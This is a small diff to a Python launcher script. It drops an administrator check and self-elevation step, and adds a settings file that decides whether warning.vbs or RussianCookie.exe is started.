@@ -1,8 +1,6 @@
-import os, ctypes, sys
-    
+import os, json
 
-if ctypes.windll.shell32.IsUserAnAdmin():
-    
-    os.startfile("warning.vbs")
+with open("scripts/settings.json", "r") as j: settings = json.load(j)
 
-else: ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[0:]), None, 1)
+if settings["first_start"]: os.startfile("warning.vbs")
+else: os.startfile("RussianCookie.exe")
